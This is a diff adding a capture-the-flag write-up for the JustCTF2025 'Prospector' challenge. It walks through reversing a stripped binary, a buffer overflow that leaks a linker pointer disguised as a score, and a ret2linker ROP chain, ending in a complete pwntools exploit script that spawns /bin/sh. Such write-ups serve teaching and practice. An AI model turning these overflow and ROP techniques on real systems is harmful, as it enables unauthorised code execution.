@@ -408,6 +408,169 @@ if __name__ == "__main__":
   </section>
 </section>
 
+<section id="back">
+  <section id="blueback" class="container">
+    <div id="prospector" class="challenge-section">
+      <div class="section-content">
+        <b>Challenge Name:</b> <span class="text">Prospector</span><br>
+        <b>Category:</b> Binary Exploitation
+        <p><br>
+          This challenge looked quite ugly at first, due to the symbols and function names being stripped.<br><br>
+          The first thing I did — as always — was to run checksec on the binary:
+        </p>
+        <pre><code>Arch:     amd64
+RELRO:    Full RELRO
+Canary:   No canary found
+NX:       NX enabled
+PIE:      PIE enabled
+SHSTK:    Enabled
+IBT:      Enabled</code></pre>
+        <p>
+          Nice — no canary! But PIE is enabled, so we’ll probably need a PIE leak. This screams ROP attack — let’s see.
+        </p>
+      </div>
+      <div class="section-content">
+        <h2>Reversing the Binary</h2>
+        <p>
+          Upon loading it into IDA, I noticed something odd: there was no <code>main()</code> function.<br>
+          Instead, the binary started from <code>_start</code>, and most of the symbols were stripped — definitely not a standard C binary.<br>
+          My guess? This was written in pure assembly or something close to it.<br><br>
+          That didn’t stop me. I passed the decompiled output to ChatGPT, which helped me break down each function. With those insights, I renamed all the functions to something more understandable and manageable.
+          <img src="{{ '/writeups/JustCTF2025/assets/pro.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+        </p>
+      </div>
+      <div class="section-content">
+        <h2>Vulnerability: Buffer Overflow</h2>
+        <p>
+          Starting from the <code>_start</code> function, I traced through the control flow and noticed something very promising:<br>
+          <img src="{{ '/writeups/JustCTF2025/assets/pro1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+          There was a classic buffer overflow vulnerability around line 14 and line 20 in the input parsing logic.<br><br>
+          With no stack canary in place, and a PIE-enabled binary, this lined up perfectly for a classic ROP attack — provided we could leak a PIE/libc address.
+        </p>
+      </div>
+      <div class="section-content">
+        <h2>Mysterious Condition</h2>
+        <p>
+          As I continued exploring the binary, I noticed a function </p>
+          <img src="{{ '/writeups/JustCTF2025/assets/pro2.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+          <p>This function was never called directly, but had a conditional check guarding it:
+          <pre><code>if ((_DWORD)result == 1)
+    return int_to_string(a2);</code></pre>
+          And elsewhere:
+          <pre><code>if (*(_DWORD *)(a1 + 8) == 1)
+    int_to_string((__int64)a2);</code></pre>
+          In both cases, the condition for calling <code>int_to_string()</code> was a comparison against the value 1. Interesting.
+        </p>
+      </div>
+      <div class="section-content">
+        <h4>Exploiting the Overflow for Code Execution</h4>
+        <p>
+        <img src="{{ '/writeups/JustCTF2025/assets/pro3.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+          I discovered that the buffer used to take the input for <code>Nick</code> is located at <code>0x7fffffffe360</code>,
+          while the memory being checked for the value <code>1</code> is at <code>0x7fffffffe3a8</code>.<br><br>
+          With the overflow primitive, I could write all the way up to that location and overwrite it with <code>1</code>, thereby triggering a call to <code>int_to_string()</code>.<br>
+          But why does that matter?
+        </p>
+      </div>
+      <div class="section-content">
+        <h2>The Real Leak</h2>
+        <p>
+          Looking inside <code>int_to_string()</code>, I found that it prints a transformed value derived from a memory address.<br>
+          This value — the player's score — was actually a disguised pointer.<br><br>
+          The transformation? Some bit shifting and arithmetic, which could be reversed:
+        </p>
+        <pre><code>reverse_score = lambda score: 0x700000000000 | ((score >> 1) << 16)</code></pre>
+        <p>
+          This function seemed useless at first glance — but in reality, it gave us a leaked pointer, disguised as a score.<br>
+          Once reversed, I confirmed the address pointed inside the <code>linker</code> (<code>ld.so</code>).<br>
+          <img src="{{ '/writeups/JustCTF2025/assets/pro4.png' | relative_url }}" alt="snippet" class="code-screenshot" />
+          That’s right — this was setting up for a <strong>ret2linker</strong> attack.
+        </p>
+      </div>
+      <div class="section-content">
+        <h2>Attack Plan</h2>
+        <ul>
+          <li><strong>Step 1: Calculate Linker Base Address</strong><br>
+            Use the leaked address to compute the base address of the linker by subtracting known offsets (you'll need to extract the same <code>ld.so</code> from the Docker image to match remote offsets).<br><br>
+            <em>Be aware:</em> Players in the Discord server <strong>raged</strong> that their exploit broke due to varying linker offsets — likely caused by mismatched kernel versions.<br>
+            Thankfully, I mean very thankfully, my WSL kernel version just chilled and gave me consistent offsets.
+          </li><br>
+          <li><strong>Step 2: ROP Gadgets from the Linker</strong><br>
+            Extract ROP gadgets from the linker using tools like <code>ROPgadget --binary ./ld.so</code>.
+          </li><br>
+          <li><strong>Step 3: Multi-Stage ROP Chain</strong>
+            <ul>
+              <li><strong>Stage 1:</strong> Read "/bin/sh" into memory (via read syscall).</li>
+              <li><strong>Stage 2:</strong> Execute <code>execve("/bin/sh")</code> syscall with that pointer.</li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+      <div class="section-content">
+        <div class="h4-wrapper">
+          <h4>Exploit Script</h4>
+          <button class="copy-btn">Copy</button>
+        </div>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+context.binary = exe = ELF('./prospector', checksec=False)
+ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
+context.arch = 'amd64'
+context.log_level = 'info'  # Set to 'debug' for verbose output
+
+reverse_score = lambda score: 0x700000000000 | ((score >> 1) << 16)
+
+def exploit():
+    io = process(exe.path)
+
+    log.info("Leaking score via input overflow...")
+    io.sendlineafter(b'Nick: ', b'A' * 72 + p64(1))  # Overflow into score struct
+    io.sendlineafter(b'Color: ', b'dummy')      # Trigger the scoring logic
+
+    io.recvuntil(b'score: ')
+    score = int(io.recvline().strip())
+    log.success(f"Leaked score: {score}")
+
+    leak = reverse_score(score)
+    ld.address = leak + 0x3000
+    log.success(f"Resolved ld base   @ {hex(ld.address)}")
+
+    # === ROP gadgets from ld.so ===
+    pop_rdi = ld.address + 0x3399
+    pop_rsi = ld.address + 0x5700
+    pop_rdx = ld.address + 0x217bb
+    pop_rax = ld.address + 0x15abb
+    syscall = ld.address + 0xb879
+
+    log.info("Building stage 1 ROP payload...")
+    rop_chain = flat(
+        b'\x00' * 0x28,
+        p64(leak + 0x40),  # new RBP
+        p64(0),               # align stack
+        pop_rax, leak,     # dummy rax setup
+        pop_rdi, leak + 0x40,
+        pop_rsi, 0,
+        pop_rdx, leak + 0x40,
+        pop_rax, 0x3b         # syscall number for execve
+    )
+
+    log.info("Sending stage 1 (ROP chain setup)...")
+    io.sendlineafter(b'Color: ', rop_chain)
+
+    log.info("Sending stage 2 (execve syscall)...")
+    shell_payload = b"/bin/sh\x00" + p64(syscall)
+    io.sendline(shell_payload)
+
+    io.interactive()
+
+if __name__ == "__main__":
+    exploit()</code></pre>
+      </div>
+    </div>
+  </section>
+</section>
+
 
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
